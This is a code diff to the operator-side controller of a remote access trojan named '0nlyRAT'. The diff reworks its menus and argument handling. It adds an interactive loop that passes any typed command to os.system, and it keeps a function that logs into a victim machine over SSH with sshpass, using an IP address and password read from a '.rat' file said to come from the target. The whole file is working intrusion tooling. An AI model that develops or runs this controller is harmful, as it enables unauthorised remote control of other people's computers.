@@ -26,36 +26,39 @@ banner = r"""
 help_menu = """
             [::] 0nlyRAT help menu [::]
 
-            Arguments:            
-                                   ____                                                               ____  
-                                  |                                                                       |
-                                  |  place the config file name with extension returned from the target   |
-            -f  <config file>   = |                                                                       |
-                                  |  File must have .rat extension                                        |
-                                  |____                                                               ____|
+            [+] Arguments:            
+                                                   ____                                                               ____  
+                                                  |                                                                       |
+                                                  |  place the config file name with extension returned from the target   |
+                python3 main.py <config file>   = |                                                                       |
+                                                  |  File must have .rat extension                                        |
+                                                  |____                                                               ____|
             
-            
-            Example:
-            python3 main.py -f <config file>
 """
 
 options_menu = """
-            [*] Select Payload (0...) [*]
-
-            Payloads:
+            [+] commands:
                 [0] Remote Console
+
+            [+] Options:
+                [-h] or [--help]     ---   help
+                [-u] or [--update]   ---   update
+                [-r] or [--remove]   ---   remove
+
+
+            * any other commands will be a default
+              terminal command
 """
 
 username = getpass.getuser()
-header = f"{username}@onlyrat $ "
+header = f"[~] {username}@onlyrat $ "
 IP_KEY = "IPADDRESS"
 PASS_KEY = "PASSWORD"
 WORKINGDIR_KEY = "WORKINGDIR"
 
 def read_config(config_file):
-    if not config_file.endswith(".rat") or not os.path.exists(config_file):
-        print(f"Error: Config file '{config_file}' is not valid.")
-        raise Exception
+    if not os.path.exists(config_file):
+        raise FileNotFoundError
     configuration = {}
     read_lines = open(config_file, "r").readlines()
     configuration[IP_KEY] = read_lines[0].strip()
@@ -67,6 +70,12 @@ def read_config(config_file):
 def connect(tgt_ipv4,tgt_pword):
     os.system(f"sshpass -p \"{tgt_pword}\" ssh onlyrat@{tgt_ipv4}")
 
+def exit():
+    print("[*] exiting...")
+    sys.exit(1)
+
+def clear():
+    os.system("clear")
 
 def os_detection():
     if os.name == "nt":
@@ -74,30 +83,56 @@ def os_detection():
     if os.name == "posix":
         return "l"
 
+def update():
+    return
+
+def remove():
+    return
+
 # command line interface
 def cli(arguments):
+    clear()
     print(banner)
-    try:
-        if not arguments:
-            raise Exception
-        configuration = read_config(sys.argv[2])
-        tgt_ipv4 = configuration.get(IP_KEY)
-        tgt_pword = configuration.get(PASS_KEY)
-        tgt_wd = configuration.get(WORKINGDIR_KEY)
-        print(options_menu)
-        option = input(f"{header}")
-        if option == "0":
-            connect(tgt_ipv4,tgt_pword)
-    except Exception:
+    if arguments:
+        argument = sys.argv[1]
+        if argument.endswith(".rat"):
+            try:
+                configuration = read_config(argument)
+            except FileNotFoundError:
+                print(f"Error: Config file '{argument}' does not exist.")
+                exit()
+            tgt_ipv4 = configuration.get(IP_KEY)
+            tgt_pword = configuration.get(PASS_KEY)
+            tgt_wd = configuration.get(WORKINGDIR_KEY)
+            print(options_menu)
+            print("\t    [*] type \"help\" for help menu [*]\n")
+            while True:
+                option = input(f"{header}")
+                if option == "0":
+                    connect(tgt_ipv4,tgt_pword)
+                elif option == "help":
+                    clear()
+                    print(banner)
+                    print(options_menu)
+                elif option in ["quit", "exit"]:
+                    exit()
+                else:
+                    os.system(option)
+                print("\n")
+        elif argument in ["-h","--help"]:
+            print(help_menu)
+        elif argument in ["-u","--update"]:
+            update()
+        elif argument in ["-r","--remove","--uninstall"]:
+            remove()
+    else:
         print(help_menu)
 
 def main():
+    clear()
     # checks for arguments
     try:
         sys.argv[1]
-        sys.argv[2]
-        if sys.argv[1] != "-f":
-            raise Exception
     except IndexError:
         arguments_exist = False
     except Exception:
